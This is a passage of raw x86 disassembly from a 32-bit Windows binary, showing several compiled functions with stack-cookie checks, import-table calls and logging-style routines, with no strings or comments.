  4049cf:	pop    esi
  4049d0:	xor    ecx,ebp
  4049d2:	pop    ebx
  4049d3:	call   0x406b70
  4049d8:	mov    esp,ebp
  4049da:	pop    ebp
  4049db:	ret    0x4
  4049de:	int3   
  4049df:	int3   
  4049e0:	int3   
  4049e1:	int3   
  4049e2:	int3   
  4049e3:	mov    edi,edi
  4049e5:	push   ebp
  4049e6:	mov    ebp,esp
  4049e8:	sub    esp,0x158
  4049ee:	mov    eax,ds:0x408004
  4049f3:	xor    eax,ebp
  4049f5:	mov    DWORD PTR [ebp-0x8],eax
  4049f8:	push   ebx
  4049f9:	push   esi
  4049fa:	mov    esi,DWORD PTR [ebp+0x8]
  4049fd:	push   edi
  4049fe:	mov    edi,DWORD PTR [ecx+0x4]
  404a01:	cmp    DWORD PTR [edi],0x5
  404a04:	jbe    0x404bad
  404a0a:	mov    eax,DWORD PTR [esi+0x4]
  404a0d:	lea    ecx,[ebp-0x10c]
  404a13:	mov    edx,DWORD PTR [esi+0x1c]
  404a16:	and    DWORD PTR [ebp-0x118],0x0
  404a1d:	and    DWORD PTR [ebp-0x110],0x0
  404a24:	push   0x4
  404a26:	mov    DWORD PTR [ebp-0x14c],eax
  404a2c:	lea    eax,[ebp-0x14c]
  404a32:	pop    ebx
  404a33:	mov    DWORD PTR [ebp-0x11c],eax
  404a39:	mov    DWORD PTR [ebp-0x114],ebx
  404a3f:	call   0x402752
  404a44:	mov    edx,DWORD PTR [esi+0x44]
  404a47:	lea    eax,[esi+0x20]
  404a4a:	and    DWORD PTR [ebp-0xf8],0x0
  404a51:	lea    ecx,[ebp-0xec]
  404a57:	and    DWORD PTR [ebp-0xf0],0x0
  404a5e:	mov    DWORD PTR [ebp-0xfc],eax
  404a64:	mov    DWORD PTR [ebp-0xf4],ebx
  404a6a:	call   0x402752
  404a6f:	mov    eax,DWORD PTR [esi]
  404a71:	lea    ecx,[ebp-0xcc]
  404a77:	mov    edx,DWORD PTR [esi+0xc]
  404a7a:	and    DWORD PTR [ebp-0xd8],0x0
  404a81:	and    DWORD PTR [ebp-0xd0],0x0
  404a88:	mov    DWORD PTR [ebp-0x158],eax
  404a8e:	lea    eax,[ebp-0x158]
  404a94:	mov    DWORD PTR [ebp-0xdc],eax
  404a9a:	mov    DWORD PTR [ebp-0xd4],ebx
  404aa0:	call   0x402789
  404aa5:	mov    eax,DWORD PTR [esi+0x10]
  404aa8:	lea    ecx,[ebp-0xac]
  404aae:	mov    edx,DWORD PTR [esi+0x28]
  404ab1:	and    DWORD PTR [ebp-0xb8],0x0
  404ab8:	and    DWORD PTR [ebp-0xb0],0x0
  404abf:	mov    DWORD PTR [ebp-0x154],eax
  404ac5:	lea    eax,[ebp-0x154]
  404acb:	mov    DWORD PTR [ebp-0xbc],eax
  404ad1:	mov    DWORD PTR [ebp-0xb4],ebx
  404ad7:	call   0x402752
  404adc:	mov    eax,DWORD PTR [esi+0x2c]
  404adf:	lea    ecx,[ebp-0x8c]
  404ae5:	mov    edx,DWORD PTR [esi+0x30]
  404ae8:	and    DWORD PTR [ebp-0x98],0x0
  404aef:	and    DWORD PTR [ebp-0x90],0x0
  404af6:	mov    DWORD PTR [ebp-0x140],eax
  404afc:	lea    eax,[ebp-0x140]
  404b02:	mov    DWORD PTR [ebp-0x9c],eax
  404b08:	mov    DWORD PTR [ebp-0x94],ebx
  404b0e:	call   0x402752
  404b13:	mov    edx,DWORD PTR [esi+0x34]
  404b16:	lea    ecx,[ebp-0x7c]
  404b19:	call   0x402789
  404b1e:	mov    eax,DWORD PTR [esi+0x38]
  404b21:	lea    ecx,[ebp-0x5c]
  404b24:	mov    edx,DWORD PTR [esi+0x3c]
  404b27:	and    DWORD PTR [ebp-0x68],0x0
  404b2b:	and    DWORD PTR [ebp-0x60],0x0
  404b2f:	mov    DWORD PTR [ebp-0x144],eax
  404b35:	lea    eax,[ebp-0x144]
  404b3b:	mov    DWORD PTR [ebp-0x6c],eax
  404b3e:	mov    DWORD PTR [ebp-0x64],ebx
  404b41:	call   0x402752
  404b46:	mov    edx,DWORD PTR [esi+0x40]
  404b49:	lea    ecx,[ebp-0x4c]
  404b4c:	call   0x402789
  404b51:	mov    eax,DWORD PTR [esi+0x8]
  404b54:	xor    ecx,ecx
  404b56:	mov    DWORD PTR [ebp-0x148],eax
  404b5c:	lea    eax,[ebp-0x148]
  404b62:	mov    DWORD PTR [ebp-0x3c],eax
  404b65:	mov    eax,DWORD PTR [esi+0x24]
  404b68:	mov    DWORD PTR [ebp-0x150],eax
  404b6e:	lea    eax,[ebp-0x150]
  404b74:	mov    DWORD PTR [ebp-0x38],ecx
  404b77:	mov    DWORD PTR [ebp-0x34],ebx
  404b7a:	mov    DWORD PTR [ebp-0x30],ecx
  404b7d:	mov    DWORD PTR [ebp-0x2c],eax
  404b80:	mov    DWORD PTR [ebp-0x28],ecx
  404b83:	mov    DWORD PTR [ebp-0x24],ebx
  404b86:	mov    DWORD PTR [ebp-0x20],ecx
  404b89:	mov    edx,DWORD PTR [esi+0x18]
  404b8c:	lea    ecx,[ebp-0x1c]
  404b8f:	call   0x402752
  404b94:	lea    eax,[ebp-0x13c]
  404b9a:	mov    edx,0x40202d
  404b9f:	push   eax
  404ba0:	push   0x13
  404ba2:	push   0x0
  404ba4:	push   0x0
  404ba6:	mov    ecx,edi
  404ba8:	call   0x402687
  404bad:	mov    ecx,DWORD PTR [ebp-0x8]
  404bb0:	pop    edi
  404bb1:	pop    esi
  404bb2:	xor    ecx,ebp
  404bb4:	pop    ebx
  404bb5:	call   0x406b70
  404bba:	mov    esp,ebp
  404bbc:	pop    ebp
  404bbd:	ret    0x4
  404bc0:	int3   
  404bc1:	int3   
  404bc2:	int3   
  404bc3:	int3   
  404bc4:	int3   
  404bc5:	int3   
  404bc6:	int3   
  404bc7:	int3   
  404bc8:	int3   
  404bc9:	int3   
  404bca:	int3   
  404bcb:	int3   
  404bcc:	int3   
  404bcd:	int3   
  404bce:	int3   
  404bcf:	int3   
  404bd0:	mov    edi,edi
  404bd2:	push   ebp
  404bd3:	mov    ebp,esp
  404bd5:	push   ecx
  404bd6:	mov    eax,ds:0x408004
  404bdb:	xor    eax,ebp
  404bdd:	mov    DWORD PTR [ebp-0x4],eax
  404be0:	push   esi
  404be1:	mov    esi,DWORD PTR [ebp+0x8]
  404be4:	push   edi
  404be5:	mov    edi,ecx
  404be7:	mov    edx,DWORD PTR [esi+0x8]
  404bea:	cmp    DWORD PTR ds:0x408040,edx
  404bf0:	mov    DWORD PTR ds:0x408040,edx
  404bf6:	sete   al
  404bf9:	test   al,al
  404bfb:	jne    0x404c11
  404bfd:	mov    eax,DWORD PTR [edi]
  404bff:	push   esi
  404c00:	push   0x0
  404c02:	mov    esi,DWORD PTR [eax+0x8]
  404c05:	mov    ecx,esi
  404c07:	call   DWORD PTR ds:0x409210
  404c0d:	mov    ecx,edi
  404c0f:	call   esi
  404c11:	mov    ecx,DWORD PTR [ebp-0x4]
  404c14:	mov    al,0x1
  404c16:	pop    edi
  404c17:	xor    ecx,ebp
  404c19:	pop    esi
  404c1a:	call   0x406b70
  404c1f:	mov    esp,ebp
  404c21:	pop    ebp
  404c22:	ret    0x4
  404c25:	int3   
  404c26:	int3   
  404c27:	int3   
  404c28:	int3   
  404c29:	int3   
  404c2a:	int3   
  404c2b:	int3   
  404c2c:	int3   
  404c2d:	int3   
  404c2e:	int3   
  404c2f:	int3   
  404c30:	mov    edi,edi
  404c32:	push   ebp
  404c33:	mov    ebp,esp
  404c35:	push   esi
  404c36:	mov    esi,ecx
  404c38:	call   0x404817
  404c3d:	test   BYTE PTR [ebp+0x8],0x1
  404c41:	je     0x404c4b
  404c43:	push   esi
  404c44:	call   DWORD PTR ds:0x4091c4
  404c4a:	pop    ecx
  404c4b:	mov    eax,esi
  404c4d:	pop    esi
  404c4e:	pop    ebp
  404c4f:	ret    0x4
  404c52:	int3   
  404c53:	int3   
  404c54:	int3   
  404c55:	int3   
  404c56:	int3   
  404c57:	mov    edi,edi
  404c59:	push   ebp
  404c5a:	mov    ebp,esp
  404c5c:	sub    esp,0x18
  404c5f:	mov    eax,ds:0x408004
  404c64:	xor    eax,ebp
  404c66:	mov    DWORD PTR [ebp-0x4],eax
  404c69:	push   ebx
  404c6a:	push   esi
  404c6b:	mov    ebx,ecx
  404c6d:	push   edi
  404c6e:	lea    edi,[ebp-0x14]
  404c71:	mov    eax,DWORD PTR [ebx+0x10]
  404c74:	mov    DWORD PTR [ebx+0x4],eax
  404c77:	mov    BYTE PTR [ebx+0x8],0x1
  404c7b:	mov    DWORD PTR [ebp-0x18],eax
  404c7e:	mov    esi,DWORD PTR [eax+0x4]
  404c81:	sub    esi,0x10
  404c84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c88:	and    DWORD PTR [eax+0x20],0x0
  404c8c:	lea    esi,[eax+0x18]
  404c8f:	and    DWORD PTR [eax+0x24],0x0
  404c93:	push   esi
  404c94:	push   eax
  404c95:	push   0x4025f0
  404c9a:	lea    eax,[ebp-0x14]
  404c9d:	push   eax
  404c9e:	call   DWORD PTR ds:0x409024
  404ca4:	test   eax,eax
  404ca6:	jne    0x404cc0
  404ca8:	mov    ecx,DWORD PTR [ebp-0x18]
  404cab:	mov    ecx,DWORD PTR [ecx+0x4]
  404cae:	movzx  eax,WORD PTR [ecx]
  404cb1:	push   eax
  404cb2:	push   ecx
  404cb3:	push   0x2
  404cb5:	push   DWORD PTR [esi+0x4]
  404cb8:	push   DWORD PTR [esi]
  404cba:	call   DWORD PTR ds:0x409020
  404cc0:	mov    eax,DWORD PTR [ebx]
  404cc2:	mov    DWORD PTR [ebx+0xc],0x1
  404cc9:	mov    esi,DWORD PTR [eax+0x4]
  404ccc:	mov    ecx,esi
  404cce:	call   DWORD PTR ds:0x409210
  404cd4:	mov    ecx,ebx
  404cd6:	call   esi
  404cd8:	mov    ecx,DWORD PTR [ebp-0x4]
  404cdb:	pop    edi
  404cdc:	pop    esi
  404cdd:	xor    ecx,ebp
  404cdf:	pop    ebx
  404ce0:	call   0x406b70
  404ce5:	mov    esp,ebp
  404ce7:	pop    ebp
  404ce8:	ret    
  404ce9:	int3   
  404cea:	int3   
  404ceb:	int3   
  404cec:	int3   
  404ced:	int3   
  404cee:	mov    edi,edi
  404cf0:	push   ebp
  404cf1:	mov    ebp,esp
  404cf3:	push   ecx
  404cf4:	push   ecx
  404cf5:	mov    eax,ds:0x408468
  404cfa:	push   esi
  404cfb:	push   edi
  404cfc:	test   al,0x1
  404cfe:	jne    0x404d13
  404d00:	or     eax,0x1
  404d03:	push   0x407370
  404d08:	mov    ds:0x408468,eax
  404d0d:	call   0x406d67
  404d12:	pop    ecx
  404d13:	lea    eax,[ebp-0x4]
  404d16:	mov    edi,0x408484
  404d1b:	push   eax
  404d1c:	lea    eax,[ebp-0x8]
  404d1f:	push   eax
  404d20:	push   0x0
  404d22:	push   edi
  404d23:	call   DWORD PTR ds:0x409080
  404d29:	cmp    DWORD PTR [ebp-0x8],0x0
  404d2d:	je     0x404d52
  404d2f:	mov    esi,0x408488
  404d34:	mov    DWORD PTR ds:0x408488,0x4010d4
  404d3e:	mov    ecx,esi
  404d40:	mov    DWORD PTR [ebp-0x4],esi
  404d43:	call   0x404d63
  404d48:	push   esi
  404d49:	push   0x0
  404d4b:	push   edi
  404d4c:	call   DWORD PTR ds:0x4090a8
  404d52:	mov    eax,DWORD PTR [ebp-0x4]
  404d55:	pop    edi
  404d56:	pop    esi
  404d57:	mov    eax,DWORD PTR [eax+0x4]
  404d5a:	mov    esp,ebp
  404d5c:	pop    ebp
  404d5d:	ret    
  404d5e:	int3   
  404d5f:	int3   
  404d60:	int3   
  404d61:	int3   
  404d62:	int3   
  404d63:	mov    edi,edi
  404d65:	push   ebp
  404d66:	mov    ebp,esp
  404d68:	and    esp,0xfffffff8
  404d6b:	sub    esp,0x10
  404d6e:	mov    eax,ds:0x408004
  404d73:	xor    eax,esp
  404d75:	mov    DWORD PTR [esp+0xc],eax
  404d79:	mov    eax,ds:0x408424
  404d7e:	push   esi
  404d7f:	push   edi
  404d80:	mov    edi,ecx
  404d82:	test   al,0x1
  404d84:	jne    0x404d99
  404d86:	or     eax,0x1
  404d89:	push   0x407310
  404d8e:	mov    ds:0x408424,eax
  404d93:	call   0x406d67
  404d98:	pop    ecx
  404d99:	lea    eax,[esp+0xc]
  404d9d:	push   eax
  404d9e:	lea    eax,[esp+0x14]
  404da2:	push   eax
  404da3:	push   0x0
  404da5:	push   0x40846c
  404daa:	call   DWORD PTR ds:0x409080
  404db0:	cmp    DWORD PTR [esp+0x10],0x0
  404db5:	je     0x404de9
  404db7:	mov    esi,0x408470
  404dbc:	mov    DWORD PTR ds:0x408470,0x4010d4
  404dc6:	mov    DWORD PTR [esp+0xc],esi
  404dca:	mov    ecx,esi
  404dcc:	mov    DWORD PTR ds:0x408480,0x408010
  404dd6:	call   0x404c57
  404ddb:	push   esi
  404ddc:	push   0x0
  404dde:	push   0x40846c
  404de3:	call   DWORD PTR ds:0x4090a8
  404de9:	mov    eax,DWORD PTR [esp+0xc]
  404ded:	mov    eax,DWORD PTR [eax+0x4]
  404df0:	mov    DWORD PTR [edi+0x4],eax
  404df3:	mov    eax,DWORD PTR [edi]
  404df5:	mov    BYTE PTR [edi+0x8],0x0
  404df9:	mov    DWORD PTR [edi+0xc],0x1
  404e00:	mov    esi,DWORD PTR [eax+0x4]
  404e03:	mov    ecx,esi
  404e05:	call   DWORD PTR ds:0x409210
  404e0b:	mov    ecx,edi
  404e0d:	call   esi
  404e0f:	mov    ecx,DWORD PTR [esp+0x14]
  404e13:	pop    edi
  404e14:	pop    esi
  404e15:	xor    ecx,esp
  404e17:	call   0x406b70
  404e1c:	mov    esp,ebp
  404e1e:	pop    ebp
  404e1f:	ret    
  404e20:	int3   
  404e21:	int3   
  404e22:	int3   
  404e23:	int3   
  404e24:	int3   
  404e25:	int3   
  404e26:	int3   
  404e27:	int3   
  404e28:	int3   
  404e29:	int3   
  404e2a:	int3   
  404e2b:	int3   
  404e2c:	int3   
  404e2d:	int3   
  404e2e:	int3   
  404e2f:	int3   
  404e30:	mov    edi,edi
  404e32:	push   ebp
  404e33:	mov    ebp,esp
  404e35:	sub    esp,0x164
  404e3b:	mov    eax,ds:0x408004
  404e40:	xor    eax,ebp
  404e42:	mov    DWORD PTR [ebp-0x4],eax
  404e45:	push   ebx
  404e46:	push   esi
  404e47:	mov    esi,ecx
  404e49:	push   edi
  404e4a:	mov    edi,DWORD PTR [esi+0x18]
  404e4d:	mov    eax,DWORD PTR [edi+0x40]
  404e50:	test   eax,eax
  404e52:	jns    0x404e5e
  404e54:	cmp    eax,DWORD PTR [edi+0x48]
  404e57:	jne    0x404e5e
  404e59:	add    edi,0x44
  404e5c:	jmp    0x404e60
  404e5e:	xor    edi,edi
  404e60:	call   0x406476
  404e65:	test   edi,edi
  404e67:	je     0x404ff8
  404e6d:	mov    eax,DWORD PTR [esi+0x18]
  404e70:	mov    eax,DWORD PTR [eax+0x28]
  404e73:	mov    DWORD PTR [ebp-0x150],eax
  404e79:	cmp    DWORD PTR [eax],0x5
  404e7c:	jbe    0x40506f
  404e82:	push   0x2000
  404e87:	push   0x0
  404e89:	mov    ecx,eax
  404e8b:	call   0x402718
  404e90:	test   al,al
  404e92:	je     0x40506f
  404e98:	mov    eax,DWORD PTR [edi+0x4]
  404e9b:	lea    ecx,[ebp-0x118]
  404ea1:	mov    edx,DWORD PTR [edi+0x1c]
  404ea4:	and    DWORD PTR [ebp-0x124],0x0
  404eab:	and    DWORD PTR [ebp-0x11c],0x0
  404eb2:	push   0x4
  404eb4:	mov    DWORD PTR [ebp-0x158],eax
  404eba:	lea    eax,[ebp-0x158]
  404ec0:	pop    ebx
  404ec1:	mov    DWORD PTR [ebp-0x128],eax
  404ec7:	mov    DWORD PTR [ebp-0x120],ebx
  404ecd:	call   0x402752
  404ed2:	mov    edx,DWORD PTR [edi+0x44]
  404ed5:	lea    eax,[edi+0x20]
  404ed8:	and    DWORD PTR [ebp-0x104],0x0
  404edf:	lea    ecx,[ebp-0xf8]
  404ee5:	and    DWORD PTR [ebp-0xfc],0x0
  404eec:	mov    DWORD PTR [ebp-0x108],eax
  404ef2:	mov    DWORD PTR [ebp-0x100],ebx
  404ef8:	call   0x402752
  404efd:	mov    eax,DWORD PTR [edi]
  404eff:	lea    ecx,[ebp-0xd8]
  404f05:	mov    edx,DWORD PTR [edi+0xc]
  404f08:	and    DWORD PTR [ebp-0xe4],0x0
  404f0f:	and    DWORD PTR [ebp-0xdc],0x0
  404f16:	mov    DWORD PTR [ebp-0x160],eax
  404f1c:	lea    eax,[ebp-0x160]
  404f22:	mov    DWORD PTR [ebp-0xe8],eax
  404f28:	mov    DWORD PTR [ebp-0xe0],ebx
  404f2e:	call   0x402789
  404f33:	mov    eax,DWORD PTR [edi+0x10]
  404f36:	lea    ecx,[ebp-0xb8]
  404f3c:	mov    edx,DWORD PTR [edi+0x28]
  404f3f:	and    DWORD PTR [ebp-0xc4],0x0
  404f46:	and    DWORD PTR [ebp-0xbc],0x0
  404f4d:	mov    DWORD PTR [ebp-0x15c],eax
  404f53:	lea    eax,[ebp-0x15c]
  404f59:	mov    DWORD PTR [ebp-0xc8],eax
  404f5f:	mov    DWORD PTR [ebp-0xc0],ebx
  404f65:	call   0x402752
  404f6a:	mov    eax,DWORD PTR [edi+0x2c]
  404f6d:	lea    ecx,[ebp-0x98]
  404f73:	mov    edx,DWORD PTR [edi+0x30]
  404f76:	and    DWORD PTR [ebp-0xa4],0x0
  404f7d:	and    DWORD PTR [ebp-0x9c],0x0
  404f84:	mov    DWORD PTR [ebp-0x154],eax
  404f8a:	lea    eax,[ebp-0x154]
  404f90:	mov    DWORD PTR [ebp-0xa8],eax
  404f96:	mov    DWORD PTR [ebp-0xa0],ebx
  404f9c:	call   0x402752
  404fa1:	mov    edx,DWORD PTR [edi+0x34]
  404fa4:	lea    ecx,[ebp-0x88]
  404faa:	call   0x402789
  404faf:	mov    eax,DWORD PTR [edi+0x38]
  404fb2:	lea    ecx,[ebp-0x68]
  404fb5:	mov    edx,DWORD PTR [edi+0x3c]
  404fb8:	and    DWORD PTR [ebp-0x74],0x0
  404fbc:	and    DWORD PTR [ebp-0x6c],0x0
  404fc0:	mov    DWORD PTR [ebp-0x14c],eax
  404fc6:	lea    eax,[ebp-0x14c]
  404fcc:	mov    DWORD PTR [ebp-0x78],eax
  404fcf:	mov    DWORD PTR [ebp-0x70],ebx
  404fd2:	call   0x402752
  404fd7:	mov    edx,DWORD PTR [edi+0x40]
  404fda:	lea    ecx,[ebp-0x58]
  404fdd:	call   0x402789
  404fe2:	mov    ecx,DWORD PTR [ebp-0x150]
  404fe8:	lea    eax,[ebp-0x148]
  404fee:	push   eax
  404fef:	push   0x10
  404ff1:	mov    edx,0x401884
  404ff6:	jmp    0x405061
  404ff8:	mov    ebx,DWORD PTR [esi+0x18]
  404ffb:	mov    edi,DWORD PTR [ebx+0x28]
  404ffe:	cmp    DWORD PTR [edi],0x5
  405001:	jbe    0x40506f
  405003:	push   0x2000
  405008:	push   0x0
  40500a:	mov    ecx,edi
  40500c:	call   0x402718
  405011:	test   al,al
  405013:	je     0x40506f
  405015:	mov    eax,DWORD PTR [ebx+0x40]
  405018:	and    DWORD PTR [ebp-0x24],0x0
  40501c:	and    DWORD PTR [ebp-0x1c],0x0
  405020:	push   0x4
  405022:	mov    DWORD PTR [ebp-0x150],eax
  405028:	lea    eax,[ebp-0x150]
  40502e:	pop    ebx
  40502f:	mov    DWORD PTR [ebp-0x28],eax
  405032:	mov    DWORD PTR [ebp-0x20],ebx
  405035:	call   DWORD PTR ds:0x4090a4
  40503b:	and    DWORD PTR [ebp-0x14],0x0
  40503f:	and    DWORD PTR [ebp-0xc],0x0
  405043:	mov    DWORD PTR [ebp-0x14c],eax
  405049:	lea    eax,[ebp-0x14c]
  40504f:	mov    DWORD PTR [ebp-0x18],eax
  405052:	mov    DWORD PTR [ebp-0x10],ebx
  405055:	lea    eax,[ebp-0x48]
  405058:	mov    edx,0x401d46
  40505d:	push   eax
  40505e:	push   ebx
  40505f:	mov    ecx,edi
  405061:	mov    eax,DWORD PTR [esi+0x18]
  405064:	push   0x0
  405066:	add    eax,0x8
  405069:	push   eax
  40506a:	call   0x402687
  40506f:	cmp    DWORD PTR [esi+0x10],0x0
  405073:	je     0x40507d
  405075:	lea    ecx,[esi+0x4]
  405078:	call   0x404050
  40507d:	mov    ecx,DWORD PTR [ebp-0x4]
  405080:	pop    edi
  405081:	pop    esi
  405082:	xor    ecx,ebp
  405084:	pop    ebx
  405085:	call   0x406b70
  40508a:	mov    esp,ebp
  40508c:	pop    ebp
  40508d:	ret    
  40508e:	int3   
  40508f:	int3   
  405090:	int3   
  405091:	int3   
  405092:	int3   
  405093:	int3   
  405094:	int3   
  405095:	int3   
  405096:	int3   
  405097:	int3   
  405098:	int3   
  405099:	int3   
  40509a:	int3   
  40509b:	int3   
  40509c:	int3   
  40509d:	int3   
  40509e:	int3   
  40509f:	int3   
  4050a0:	mov    edi,edi
  4050a2:	push   ebp
  4050a3:	mov    ebp,esp
  4050a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4050a8:	cmp    DWORD PTR ds:0x408040,ecx
  4050ae:	mov    DWORD PTR ds:0x408040,ecx
  4050b4:	sete   al
  4050b7:	pop    ebp
  4050b8:	ret    0x4
  4050bb:	int3   
  4050bc:	int3   
  4050bd:	int3   
  4050be:	int3   
  4050bf:	int3   
  4050c0:	mov    edi,edi
  4050c2:	push   ebp
  4050c3:	mov    ebp,esp
  4050c5:	sub    esp,0x64
  4050c8:	mov    eax,ds:0x408004
  4050cd:	xor    eax,ebp
  4050cf:	mov    DWORD PTR [ebp-0x4],eax
  4050d2:	push   ebx
  4050d3:	push   esi
  4050d4:	push   edi
  4050d5:	mov    esi,ecx
  4050d7:	call   0x406418
  4050dc:	mov    eax,DWORD PTR [esi+0x18]
  4050df:	xor    ebx,ebx
  4050e1:	mov    edi,DWORD PTR [eax+0x28]
  4050e4:	cmp    DWORD PTR [edi],0x5
  4050e7:	jbe    0x40515f
  4050e9:	push   0x2000
  4050ee:	push   ebx
  4050ef:	mov    ecx,edi
  4050f1:	call   0x402718
  4050f6:	test   al,al
  4050f8:	je     0x40515f
  4050fa:	call   DWORD PTR ds:0x4090a4
  405100:	mov    DWORD PTR [ebp-0x60],eax
  405103:	lea    eax,[ebp-0x60]
  405106:	mov    DWORD PTR [ebp-0x38],eax
  405109:	lea    eax,[ebp+0x8]
  40510c:	mov    DWORD PTR [ebp-0x28],eax
  40510f:	movzx  eax,BYTE PTR [ebp+0xc]
  405113:	push   0x4
  405115:	pop    ecx
  405116:	mov    DWORD PTR [ebp-0x5c],eax
  405119:	lea    eax,[ebp-0x5c]
  40511c:	mov    DWORD PTR [ebp-0x34],ebx
  40511f:	mov    DWORD PTR [ebp-0x30],ecx
  405122:	mov    DWORD PTR [ebp-0x2c],ebx
  405125:	mov    DWORD PTR [ebp-0x24],ebx
  405128:	mov    DWORD PTR [ebp-0x20],0x2
  40512f:	mov    DWORD PTR [ebp-0x1c],ebx
  405132:	mov    DWORD PTR [ebp-0x18],eax
  405135:	mov    DWORD PTR [ebp-0x14],ebx
  405138:	mov    DWORD PTR [ebp-0x10],ecx
  40513b:	mov    DWORD PTR [ebp-0xc],ebx
  40513e:	lea    eax,[ebp-0x58]
  405141:	mov    ecx,esi
  405143:	push   eax
  405144:	push   0x5
  405146:	call   0x4063f0
  40514b:	push   eax
  40514c:	mov    eax,DWORD PTR [esi+0x18]
  40514f:	mov    edx,0x4017f5
  405154:	add    eax,0x8
  405157:	mov    ecx,edi
  405159:	push   eax
  40515a:	call   0x402687
  40515f:	cmp    DWORD PTR [esi+0x10],ebx
  405162:	jne    0x40516c
  405164:	lea    ecx,[esi+0x4]
  405167:	call   0x404011
  40516c:	mov    ecx,DWORD PTR [ebp-0x4]
  40516f:	pop    edi
  405170:	pop    esi
  405171:	xor    ecx,ebp
  405173:	pop    ebx
  405174:	call   0x406b70
  405179:	mov    esp,ebp
  40517b:	pop    ebp
  40517c:	ret    0x8
  40517f:	int3   
  405180:	int3   
  405181:	int3   
  405182:	int3   
  405183:	int3   
  405184:	int3   
  405185:	int3   
  405186:	int3   
  405187:	int3   
  405188:	int3   
  405189:	int3   
  40518a:	int3   
  40518b:	int3   
  40518c:	int3   
  40518d:	int3   
  40518e:	int3   
  40518f:	int3   
  405190:	mov    edi,edi
  405192:	push   ebp
  405193:	mov    ebp,esp
  405195:	sub    esp,0x164
  40519b:	mov    eax,ds:0x408004
  4051a0:	xor    eax,ebp
  4051a2:	mov    DWORD PTR [ebp-0x4],eax
  4051a5:	push   ebx
  4051a6:	push   esi
  4051a7:	mov    esi,ecx
  4051a9:	push   edi
  4051aa:	mov    edi,DWORD PTR [esi+0x18]
  4051ad:	mov    eax,DWORD PTR [edi+0x40]
  4051b0:	test   eax,eax
  4051b2:	jns    0x4051be
  4051b4:	cmp    eax,DWORD PTR [edi+0x48]
  4051b7:	jne    0x4051be
  4051b9:	add    edi,0x44
  4051bc:	jmp    0x4051c0
  4051be:	xor    edi,edi
  4051c0:	call   0x406476
  4051c5:	test   edi,edi
  4051c7:	je     0x405358
  4051cd:	mov    eax,DWORD PTR [esi+0x18]
  4051d0:	mov    eax,DWORD PTR [eax+0x28]
  4051d3:	mov    DWORD PTR [ebp-0x150],eax
  4051d9:	cmp    DWORD PTR [eax],0x5
  4051dc:	jbe    0x4053cf
  4051e2:	push   0x2000
  4051e7:	push   0x0
  4051e9:	mov    ecx,eax
  4051eb:	call   0x402718
  4051f0:	test   al,al
  4051f2:	je     0x4053cf
  4051f8:	mov    eax,DWORD PTR [edi+0x4]
  4051fb:	lea    ecx,[ebp-0x118]
  405201:	mov    edx,DWORD PTR [edi+0x1c]
  405204:	and    DWORD PTR [ebp-0x124],0x0
  40520b:	and    DWORD PTR [ebp-0x11c],0x0
  405212:	push   0x4
  405214:	mov    DWORD PTR [ebp-0x158],eax
  40521a:	lea    eax,[ebp-0x158]
  405220:	pop    ebx
  405221:	mov    DWORD PTR [ebp-0x128],eax
  405227:	mov    DWORD PTR [ebp-0x120],ebx
  40522d:	call   0x402752
  405232:	mov    edx,DWORD PTR [edi+0x44]
  405235:	lea    eax,[edi+0x20]
  405238:	and    DWORD PTR [ebp-0x104],0x0
  40523f:	lea    ecx,[ebp-0xf8]
  405245:	and    DWORD PTR [ebp-0xfc],0x0
  40524c:	mov    DWORD PTR [ebp-0x108],eax
  405252:	mov    DWORD PTR [ebp-0x100],ebx
  405258:	call   0x402752
  40525d:	mov    eax,DWORD PTR [edi]
  40525f:	lea    ecx,[ebp-0xd8]
  405265:	mov    edx,DWORD PTR [edi+0xc]
  405268:	and    DWORD PTR [ebp-0xe4],0x0
  40526f:	and    DWORD PTR [ebp-0xdc],0x0
  405276:	mov    DWORD PTR [ebp-0x160],eax
  40527c:	lea    eax,[ebp-0x160]
  405282:	mov    DWORD PTR [ebp-0xe8],eax
  405288:	mov    DWORD PTR [ebp-0xe0],ebx
  40528e:	call   0x402789
  405293:	mov    eax,DWORD PTR [edi+0x10]
  405296:	lea    ecx,[ebp-0xb8]
  40529c:	mov    edx,DWORD PTR [edi+0x28]
  40529f:	and    DWORD PTR [ebp-0xc4],0x0
  4052a6:	and    DWORD PTR [ebp-0xbc],0x0
  4052ad:	mov    DWORD PTR [ebp-0x15c],eax
  4052b3:	lea    eax,[ebp-0x15c]
  4052b9:	mov    DWORD PTR [ebp-0xc8],eax
  4052bf:	mov    DWORD PTR [ebp-0xc0],ebx
  4052c5:	call   0x402752
  4052ca:	mov    eax,DWORD PTR [edi+0x2c]
  4052cd:	lea    ecx,[ebp-0x98]
  4052d3:	mov    edx,DWORD PTR [edi+0x30]
  4052d6:	and    DWORD PTR [ebp-0xa4],0x0
  4052dd:	and    DWORD PTR [ebp-0x9c],0x0
  4052e4:	mov    DWORD PTR [ebp-0x154],eax
  4052ea:	lea    eax,[ebp-0x154]
  4052f0:	mov    DWORD PTR [ebp-0xa8],eax
  4052f6:	mov    DWORD PTR [ebp-0xa0],ebx
  4052fc:	call   0x402752
  405301:	mov    edx,DWORD PTR [edi+0x34]
  405304:	lea    ecx,[ebp-0x88]
  40530a:	call   0x402789
  40530f:	mov    eax,DWORD PTR [edi+0x38]
  405312:	lea    ecx,[ebp-0x68]
  405315:	mov    edx,DWORD PTR [edi+0x3c]
  405318:	and    DWORD PTR [ebp-0x74],0x0
  40531c:	and    DWORD PTR [ebp-0x6c],0x0
  405320:	mov    DWORD PTR [ebp-0x14c],eax
  405326:	lea    eax,[ebp-0x14c]
  40532c:	mov    DWORD PTR [ebp-0x78],eax
  40532f:	mov    DWORD PTR [ebp-0x70],ebx
  405332:	call   0x402752
  405337:	mov    edx,DWORD PTR [edi+0x40]
  40533a:	lea    ecx,[ebp-0x58]
  40533d:	call   0x402789
  405342:	mov    ecx,DWORD PTR [ebp-0x150]
  405348:	lea    eax,[ebp-0x148]
  40534e:	push   eax
  40534f:	push   0x10
  405351:	mov    edx,0x40217f
  405356:	jmp    0x4053c1
  405358:	mov    ebx,DWORD PTR [esi+0x18]
  40535b:	mov    edi,DWORD PTR [ebx+0x28]
  40535e:	cmp    DWORD PTR [edi],0x5
  405361:	jbe    0x4053cf
  405363:	push   0x2000
  405368:	push   0x0
  40536a:	mov    ecx,edi
  40536c:	call   0x402718
